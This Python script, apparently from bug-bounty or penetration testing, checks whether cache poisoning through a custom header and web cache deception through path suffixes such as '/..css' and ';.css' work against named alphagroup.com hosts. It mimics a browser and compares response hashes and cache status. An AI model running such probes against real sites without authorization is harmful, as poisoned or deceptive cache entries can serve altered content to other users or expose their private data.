import requests
import time
import random
import hashlib
from urllib.parse import urlparse

# Headers mimicking a real browser
BROWSER_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

def get_random_cb():
    return f"cb={int(time.time())}_{random.randint(1000, 9999)}"

def fetch(url, headers=None, label="REQUEST", session=None):
    if session is None:
        session = requests.Session()
    
    final_headers = BROWSER_HEADERS.copy()
    if headers:
        final_headers.update(headers)
        
    print(f"[{label}] Fetching {url}...")
    try:
        resp = session.get(url, headers=final_headers, timeout=15, verify=True)
        content_len = len(resp.content)
        content_hash = hashlib.md5(resp.content).hexdigest()
        print(f"  -> Status: {resp.status_code}")
        print(f"  -> Length: {content_len}")
        print(f"  -> Hash:   {content_hash}")
        
        if "cf-cache-status" in resp.headers:
             print(f"  -> Cache-Status: {resp.headers['cf-cache-status']}")
        
        return resp, content_hash
    except Exception as e:
        print(f"  -> ERROR: {e}")
        return None, None

def verify_header_poison(target_base, vuln_name, poison_header_name, poison_header_value):
    print(f"\n=== Verifying {vuln_name} ===")
    session = requests.Session()
    session.headers.update(BROWSER_HEADERS)
    
    cb = get_random_cb()
    target_url = f"{target_base}?{cb}"
    
    # 1. Baseline
    print("\n--- Step 1: Baseline ---")
    base_resp, base_hash = fetch(target_url, label="BASELINE", session=session)
    if not base_resp:
        return

    time.sleep(random.uniform(3, 5))

    # 2. Poison
    print("\n--- Step 2: Poison ---")
    poison_headers = {poison_header_name: poison_header_value}
    poison_resp, poison_hash = fetch(target_url, headers=poison_headers, label="POISON", session=session)
    
    time.sleep(random.uniform(3, 5))

    # 3. Verify
    print("\n--- Step 3: Verify ---")
    verify_resp, verify_hash = fetch(target_url, label="VERIFY", session=session)
    
    print("\n--- Analysis ---")
    if not verify_resp or not poison_resp: 
        return

    if poison_hash == base_hash:
        print("RESULT: Safe. (Poison had no effect on response body)")
    elif verify_hash == poison_hash:
        if verify_hash != base_hash:
             print("RESULT: POTENTIAL HIT! Verify matches Poison and differs from Baseline.")
        else:
             print("RESULT: Safe. (Verify == Poison == Baseline)")
    else:
        print("RESULT: Safe. (Verify returned to Baseline or different state)")

def verify_wcd(base_url, vuln_name, path_suffix):
    print(f"\n=== Verifying {vuln_name} ===")
    session = requests.Session()
    session.headers.update(BROWSER_HEADERS)
    
    cb = get_random_cb()
    
    # Construct urls
    parsed = urlparse(base_url)
    clean_url = f"{base_url}?{cb}"
    
    # WCD Target: http://host/path/..css?cb=...
    # Ensure no double slash unless intended
    base_path = parsed.path.rstrip('/')
    wcd_url = f"{parsed.scheme}://{parsed.netloc}{base_path}{path_suffix}?{cb}"
    
    # 1. Baseline (Clean URL content)
    print("\n--- Step 1: Baseline (Expected Content) ---")
    base_resp, base_hash = fetch(clean_url, label="BASELINE", session=session)
    if not base_resp: return

    time.sleep(random.uniform(3, 5))

    # 2. Poison Attempt (Requesting the deceptive path)
    # Ideally, this sets the cache for this URL.
    print(f"\n--- Step 2: Poison Attempt (Fetching {path_suffix}) ---")
    poison_resp, poison_hash = fetch(wcd_url, label="POISON", session=session)
    
    if not poison_resp: return

    # Check if we got the "Baseline" content (meaning traversal/ignore worked)
    if poison_hash == base_hash:
        print("  -> NOTE: Path traversal successful/ignored. Server returned Baseline content.")
    else:
        print("  -> NOTE: Server returned different content (maybe 404 or error).")
        print("  -> WCD unlikely if content is not sensitive/valid.")

    time.sleep(random.uniform(3, 5))

    # 3. Verify (Fetch again to see if cached)
    # For WCD, the "Verify" is effectively checking if the previous request was cached.
    # WCD isn't about poisoning *other* users (unless they visit this URL), it's about
    # the cache storing private data (from session) under a static URL.
    # Here we just check if it's cached at all.
    print("\n--- Step 3: Verify (Cache Check) ---")
    verify_resp, verify_hash = fetch(wcd_url, label="VERIFY", session=session)
    
    print("\n--- Analysis ---")
    if verify_resp.headers.get("cf-cache-status") in ["HIT", "MISS"]:
         print(f"RESULT: Cacheable? YES ({verify_resp.headers.get('cf-cache-status')})")
    else:
         print("RESULT: Cacheable? NO/UNKNOWN")

    if poison_hash == base_hash:
         print("RESULT: Path Ignored? YES (served homepage/baseline)")
    else:
         print("RESULT: Path Ignored? NO")


if __name__ == "__main__":
    # Test 1: X-Tablet-Device
    verify_header_poison(
        "https://docs.alphagroup.com/reference/beneficiariescontrollerv4_getallbeneficiaries",
        "MethodOverride-Tablet",
        "X-Tablet-Device",
        "true"
    )

    # Test 2: WCD 1
    verify_wcd(
        "http://hooks.integrations.alphagroup.com/",
        "WCD-slash-dot-.css",
        "/..css"
    )

    # Test 3: WCD 2
    verify_wcd(
        "http://hooks.integrations.alphagroup.com/",
        "WCD-double-slash-.css",
        "//.css"
    )

    # Test 4: WCD 2.0 (Semicolon)
    verify_wcd(
        "http://hooks.integrations.alphagroup.com/",
        "WCD-semicolon",
        ";.css"
    )
